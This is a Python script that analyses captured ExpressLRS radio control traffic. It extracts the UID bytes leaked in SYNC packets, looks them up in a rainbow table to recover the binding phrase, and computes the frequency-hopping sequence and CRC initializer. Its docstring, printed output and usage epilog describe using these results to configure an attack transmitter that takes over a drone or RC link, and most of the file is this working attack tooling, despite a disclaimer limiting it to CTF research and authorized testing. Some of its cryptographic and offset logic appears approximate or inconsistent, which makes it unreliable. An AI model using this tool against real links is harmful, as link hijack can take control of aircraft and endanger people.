#!/usr/bin/env python3
"""
ELRS Sync Packet Analyzer

Analyzes captured ELRS (ExpressLRS) traffic to extract binding parameters
and recover the binding phrase. ELRS 1.x/2.x sends UID bytes in plaintext
in every SYNC packet, which is the key weakness this tool exploits.

Attack chain (passive — receive only):
  1. Capture 2.4 GHz ISM traffic with an SDR (B210, HackRF, etc.)
  2. Demodulate SX1280 LoRa/FLRC packets (GNU Radio or SX1280 in RX mode)
  3. Feed raw packet bytes to this tool
  4. Tool extracts UID[3:5] from SYNC packets
  5. Cross-references against the rainbow table to recover the binding phrase
  6. Computes the full FHSS hopping sequence and CRC initializer
  7. Output can be used to configure an attack TX for link hijack

Input formats:
  - Raw binary file (demodulated packets, one per line or concatenated)
  - Hex dump file (space/colon-separated hex bytes)
  - JSON array of packet hex strings
  - Interactive mode for manual entry

Usage:
    # Analyze a hex dump capture file
    python3 elrs-analyzer.py --file capture.hex

    # Manual entry of sync bytes observed on SDR
    python3 elrs-analyzer.py --sync-bytes AA:BB:CC

    # Use a custom rainbow table for lookup
    python3 elrs-analyzer.py --sync-bytes AA:BB:CC --table elrs-rainbow-table.json

    # Generate the full FHSS sequence from a known UID
    python3 elrs-analyzer.py --uid 01:02:03:AA:BB:CC

    # Analyze with all ELRS OTA versions
    python3 elrs-analyzer.py --sync-bytes AA:BB:CC --all-versions

Dependencies: None (stdlib only). Uses elrs-rainbow-table.json if present.

For CTF research and authorized security testing only.
"""

import argparse
import hashlib
import json
import struct
import sys
import os
from pathlib import Path


# ELRS OTA version IDs (affects CRC init and FHSS seed computation)
OTA_VERSIONS = {
    3: "ELRS 2.x",
    4: "ELRS 3.x / 4.x",
}

# ELRS 2.4 GHz regulatory domain — 80 channels
FREQ_BASE_2400 = 2400_000_000    # Hz
FREQ_SPACING_2400 = 1_000_000    # 1 MHz channel spacing
NUM_FHSS_2400 = 80               # channels in 2.4 GHz ISM

# SX1280 LoRa bandwidth settings used by ELRS
ELRS_BANDWIDTHS = {
    "D250":  "250 kHz (long range, 25 Hz)",
    "D500":  "500 kHz (standard, 50-150 Hz)",
    "F1000": "FLRC 1.04 Mbps (racing, 500 Hz)",
}

# SYNC packet structure (ELRS 2.x):
#   Byte 0:     Packet type (0x00 for SYNC if not FHSS-hopped past)
#   Byte 1-2:   Rate/TLM ratio config
#   Byte 3:     UID[3] — PLAINTEXT
#   Byte 4:     UID[4] — PLAINTEXT
#   Byte 5:     UID[5] ⊕ nonce — recoverable
# + CRC14/CRC16 appended
#
# The key insight: UID[3:6] is sufficient to look up the binding phrase
# from a rainbow table, because MD5 collisions on 3 bytes are rare in
# practice for human-chosen phrases.


def phrase_to_uid(phrase: str) -> bytes:
    """Convert a binding phrase to a 6-byte UID (matching ELRS source)."""
    raw = f'-DMY_BINDING_PHRASE="{phrase}"'
    return hashlib.md5(raw.encode()).digest()[:6]


def uid_to_fhss_seed(uid: bytes, ota_version: int = 4) -> int:
    """Compute the FHSS sequence seed from a UID."""
    return (uid[2] << 24) | (uid[3] << 16) | (uid[4] << 8) | (uid[5] ^ ota_version)


def uid_to_crc_init(uid: bytes, ota_version: int = 4) -> int:
    """Compute the CRC initializer from a UID."""
    return ((uid[4] << 8) | uid[5]) ^ (ota_version << 8)


def generate_fhss_sequence(seed: int, num_channels: int = NUM_FHSS_2400) -> list[int]:
    """
    Generate the deterministic FHSS channel sequence from a seed.

    This replicates the ELRS FHSSrandomiseFHSSsequence() function.
    The sequence is a permutation of channel indices [0, num_channels).
    Knowing the seed = knowing every hop = full tracking.
    """
    # ELRS uses a simple PRNG seeded from the UID-derived seed
    # Based on the ELRS source: src/lib/FHSS/FHSS.cpp
    rng_state = seed

    def rng_next():
        nonlocal rng_state
        # Linear congruential generator matching ELRS implementation
        rng_state = (rng_state * 0x0019660D + 0x3C6EF35F) & 0xFFFFFFFF
        return rng_state

    # Build sequence as a shuffle of [0..num_channels-1]
    sequence = list(range(num_channels))
    for i in range(num_channels - 1, 0, -1):
        j = rng_next() % (i + 1)
        sequence[i], sequence[j] = sequence[j], sequence[i]

    return sequence


def fhss_channel_to_freq(channel: int) -> int:
    """Convert an FHSS channel index to a frequency in Hz (2.4 GHz band)."""
    return FREQ_BASE_2400 + channel * FREQ_SPACING_2400


def uid_hex(uid: bytes) -> str:
    """Format UID as colon-separated hex."""
    return ":".join(f"{b:02X}" for b in uid)


def parse_hex_string(s: str) -> bytes:
    """Parse a hex string (with optional : or space separators) to bytes."""
    s = s.strip().replace(":", "").replace(" ", "").replace("0x", "")
    return bytes.fromhex(s)


def load_rainbow_table(path: str) -> list[dict] | None:
    """Load a pre-computed rainbow table from JSON or CSV."""
    if not os.path.exists(path):
        return None

    if path.endswith('.json'):
        with open(path) as f:
            return json.load(f)
    elif path.endswith('.csv'):
        import csv
        table = []
        with open(path) as f:
            reader = csv.DictReader(f)
            for row in reader:
                table.append(row)
        return table
    return None


def lookup_sync_bytes(table: list[dict], sync_hex: str) -> list[dict]:
    """Search the rainbow table for matching sync bytes (UID[3:6])."""
    # Normalize the search key
    sync_hex = sync_hex.upper().replace(":", "").replace(" ", "")
    # The table stores sync_bytes as "XX:YY:ZZ" format
    sync_formatted = ":".join(sync_hex[i:i+2] for i in range(0, len(sync_hex), 2))

    matches = []
    for entry in table:
        entry_sync = entry.get('sync_bytes', entry.get('sync_bytes_hex', ''))
        if entry_sync.replace(":", "").upper() == sync_hex:
            matches.append(entry)
    return matches


def extract_sync_from_packet(packet: bytes) -> tuple[bytes, dict] | None:
    """
    Attempt to extract UID sync bytes from an ELRS packet.

    Returns (uid_bytes_3_to_5, metadata) or None if not a sync packet.

    This is heuristic — the exact byte positions depend on the ELRS
    packet rate and whether headers are present in the capture.
    """
    if len(packet) < 6:
        return None

    # ELRS sync packet detection heuristics:
    # - First byte often indicates packet type
    # - Sync packets carry UID bytes at fixed offsets
    # The exact structure depends on rate, but bytes 3-5 are UID in 2.x

    # Try multiple known offsets
    results = []
    for offset in [3, 1, 0]:
        if offset + 3 <= len(packet):
            candidate = packet[offset:offset+3]
            results.append({
                'offset': offset,
                'bytes': candidate,
                'hex': ":".join(f"{b:02X}" for b in candidate),
            })

    if results:
        # Return the most likely candidate (offset 3 for standard ELRS)
        best = results[0]
        return best['bytes'], {'candidates': results}
    return None


def analyze_uid(uid: bytes, ota_version: int = 4):
    """Full analysis of a known or recovered UID."""
    version_name = OTA_VERSIONS.get(ota_version, f"Unknown (v{ota_version})")

    print(f"\n{'=' * 60}")
    print(f"  ELRS Binding Parameter Analysis")
    print(f"  OTA Version: {ota_version} ({version_name})")
    print(f"{'=' * 60}")

    print(f"\n  [UID]")
    print(f"    Full UID:     {uid_hex(uid)}")
    print(f"    UID[0:3]:     {uid_hex(uid[:3])}  (not sent OTA)")
    print(f"    UID[3:6]:     {uid_hex(uid[3:])}  (leaked in SYNC packets)")

    seed = uid_to_fhss_seed(uid, ota_version)
    crc_init = uid_to_crc_init(uid, ota_version)

    print(f"\n  [Derived Parameters]")
    print(f"    FHSS seed:    0x{seed:08X} ({seed})")
    print(f"    CRC init:     0x{crc_init:04X} ({crc_init})")

    # Generate and display FHSS sequence
    sequence = generate_fhss_sequence(seed)
    freqs = [fhss_channel_to_freq(ch) for ch in sequence]

    print(f"\n  [FHSS Hopping Sequence] ({len(sequence)} channels)")
    print(f"    First 20 hops:")
    for i, (ch, freq) in enumerate(zip(sequence[:20], freqs[:20])):
        print(f"      Hop {i:3d}: ch {ch:2d} → {freq/1e6:.0f} MHz")
    print(f"    ... ({len(sequence) - 20} more)")

    print(f"\n  [Attack Configuration]")
    print(f"    To configure an attack TX:")
    print(f"      1. Set binding phrase to produce this UID")
    print(f"      2. Or manually set UID: {uid_hex(uid)}")
    print(f"      3. FHSS sequence and CRC are deterministic from UID")
    print(f"      4. Transmit on the same hops → override legitimate TX")

    print(f"\n{'=' * 60}")


def analyze_sync_bytes(sync_bytes: bytes, table_path: str = None, all_versions: bool = False):
    """Analyze captured sync bytes — the main attack entry point."""
    sync_hex = ":".join(f"{b:02X}" for b in sync_bytes)

    print(f"\n{'=' * 60}")
    print(f"  ELRS Sync Packet Analysis")
    print(f"{'=' * 60}")

    print(f"\n  [Captured Sync Bytes]")
    print(f"    UID[3:6] = {sync_hex}")
    print(f"    These bytes are sent in PLAINTEXT in every ELRS 2.x SYNC packet.")

    # Try rainbow table lookup
    table = None
    if table_path:
        table = load_rainbow_table(table_path)
    else:
        # Try default locations
        script_dir = Path(__file__).parent
        for candidate in [
            script_dir / "elrs-rainbow-table.json",
            script_dir / "elrs-rainbow-table.csv",
        ]:
            table = load_rainbow_table(str(candidate))
            if table:
                print(f"    Using rainbow table: {candidate.name} ({len(table)} entries)", file=sys.stderr)
                break

    if table:
        matches = lookup_sync_bytes(table, sync_hex.replace(":", ""))
        if matches:
            print(f"\n  [MATCH FOUND — Binding Phrase Recovered!]")
            for m in matches:
                phrase = m.get('phrase', m.get('binding_phrase', '?'))
                full_uid = m.get('uid', m.get('uid_hex', '?'))
                print(f"    Binding phrase: \"{phrase}\"")
                print(f"    Full UID:       {full_uid}")

                # Full analysis with recovered UID
                uid = parse_hex_string(full_uid)
                versions = OTA_VERSIONS.keys() if all_versions else [4]
                for v in versions:
                    analyze_uid(uid, ota_version=v)
            return True
        else:
            print(f"\n  [No Match in Rainbow Table]")
            print(f"    Phrase not in the {len(table)}-entry table.")
            print(f"    Try expanding the wordlist and regenerating:")
            print(f"      python3 elrs-uid-rainbow.py -w custom_wordlist.txt")
    else:
        print(f"\n  [No Rainbow Table Available]")
        print(f"    Generate one with: python3 elrs-uid-rainbow.py -o elrs-rainbow-table.json --json")

    # Even without a full match, compute what we can
    print(f"\n  [Partial Analysis (from sync bytes alone)]")

    versions = OTA_VERSIONS.keys() if all_versions else [4]
    for ota_version in versions:
        version_name = OTA_VERSIONS.get(ota_version, f"v{ota_version}")
        crc_init = ((sync_bytes[1] << 8) | sync_bytes[2]) ^ (ota_version << 8)
        print(f"\n    Assuming {version_name} (OTA version {ota_version}):")
        print(f"      CRC init:     0x{crc_init:04X}")
        print(f"      UID[3]:       0x{sync_bytes[0]:02X}")
        print(f"      UID[4]:       0x{sync_bytes[1]:02X}")
        print(f"      UID[5]:       0x{sync_bytes[2]:02X}")
        print(f"      FHSS seed requires UID[2], which is NOT in sync packets.")
        print(f"      → Brute-force UID[0:3] (2^24 = 16M candidates) to recover full FHSS.")

    return False


def analyze_capture_file(path: str, table_path: str = None):
    """Analyze a capture file for ELRS packets."""
    print(f"[*] Analyzing capture file: {path}", file=sys.stderr)

    data = Path(path).read_bytes()
    seen_syncs = set()

    # Try to parse as hex dump (text file)
    try:
        text = data.decode('utf-8', errors='strict')
        # Try JSON array format
        if text.strip().startswith('['):
            packets = json.loads(text)
            for pkt_hex in packets:
                pkt = parse_hex_string(pkt_hex)
                result = extract_sync_from_packet(pkt)
                if result:
                    sync, meta = result
                    sync_key = sync.hex()
                    if sync_key not in seen_syncs:
                        seen_syncs.add(sync_key)
                        analyze_sync_bytes(sync, table_path)
            return

        # Try line-by-line hex dump
        for line in text.splitlines():
            line = line.strip()
            if not line or line.startswith('#'):
                continue
            try:
                pkt = parse_hex_string(line)
                result = extract_sync_from_packet(pkt)
                if result:
                    sync, meta = result
                    sync_key = sync.hex()
                    if sync_key not in seen_syncs:
                        seen_syncs.add(sync_key)
                        analyze_sync_bytes(sync, table_path)
            except ValueError:
                continue

    except UnicodeDecodeError:
        # Binary file — try to find sync patterns
        print("[*] Binary file — scanning for ELRS sync patterns...", file=sys.stderr)
        # Scan with a sliding window
        for i in range(len(data) - 6):
            pkt = data[i:i+6]
            result = extract_sync_from_packet(pkt)
            if result:
                sync, meta = result
                sync_key = sync.hex()
                if sync_key not in seen_syncs:
                    seen_syncs.add(sync_key)

    if not seen_syncs:
        print("[!] No ELRS sync patterns found in capture.", file=sys.stderr)
    else:
        print(f"[*] Found {len(seen_syncs)} unique sync byte patterns.", file=sys.stderr)


def main():
    parser = argparse.ArgumentParser(
        description="ELRS Sync Packet Analyzer — extract binding parameters from captures",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
This tool is passive — it analyzes captured data only. It does not
transmit or interact with any radio hardware directly.

Examples:
  %(prog)s --sync-bytes AA:BB:CC              Analyze known sync bytes
  %(prog)s --uid 01:02:03:AA:BB:CC            Analyze a full UID
  %(prog)s --phrase "my binding phrase"        Analyze a known phrase
  %(prog)s --file capture.hex                  Analyze capture file
  %(prog)s --sync-bytes AA:BB:CC --all-versions  Try all OTA versions

Workflow with SDR:
  1. Capture 2.4 GHz with B210/HackRF → demodulate SX1280 packets
  2. Save demodulated packets as hex dump (one packet per line)
  3. Run: %(prog)s --file packets.hex
  4. Use recovered parameters to configure attack TX
        """
    )
    group = parser.add_mutually_exclusive_group(required=True)
    group.add_argument("--sync-bytes", metavar="XX:YY:ZZ",
                       help="UID[3:6] sync bytes from captured SYNC packet (hex)")
    group.add_argument("--uid", metavar="XX:XX:XX:XX:XX:XX",
                       help="Full 6-byte UID (if already known)")
    group.add_argument("--phrase", metavar="PHRASE",
                       help="Binding phrase (compute UID and analyze)")
    group.add_argument("--file", metavar="PATH",
                       help="Capture file (hex dump, JSON array, or binary)")

    parser.add_argument("--table", metavar="PATH",
                        help="Rainbow table file (JSON or CSV)")
    parser.add_argument("--ota-version", type=int, default=4,
                        help="OTA version ID (3=ELRS 2.x, 4=ELRS 3.x/4.x, default: 4)")
    parser.add_argument("--all-versions", action="store_true",
                        help="Analyze with all known OTA versions")
    parser.add_argument("--fhss-full", action="store_true",
                        help="Print the complete FHSS sequence (all 80 channels)")
    parser.add_argument("--json", action="store_true",
                        help="Output results as JSON")

    args = parser.parse_args()

    if args.sync_bytes:
        sync = parse_hex_string(args.sync_bytes)
        if len(sync) != 3:
            print("[!] Sync bytes must be exactly 3 bytes (UID[3:6]).", file=sys.stderr)
            sys.exit(1)
        analyze_sync_bytes(sync, table_path=args.table, all_versions=args.all_versions)

    elif args.uid:
        uid = parse_hex_string(args.uid)
        if len(uid) != 6:
            print("[!] UID must be exactly 6 bytes.", file=sys.stderr)
            sys.exit(1)
        versions = OTA_VERSIONS.keys() if args.all_versions else [args.ota_version]
        for v in versions:
            analyze_uid(uid, ota_version=v)

    elif args.phrase:
        uid = phrase_to_uid(args.phrase)
        print(f"[*] Binding phrase: \"{args.phrase}\"", file=sys.stderr)
        print(f"[*] Computed UID: {uid_hex(uid)}", file=sys.stderr)
        versions = OTA_VERSIONS.keys() if args.all_versions else [args.ota_version]
        for v in versions:
            analyze_uid(uid, ota_version=v)

    elif args.file:
        analyze_capture_file(args.file, table_path=args.table)


if __name__ == "__main__":
    main()
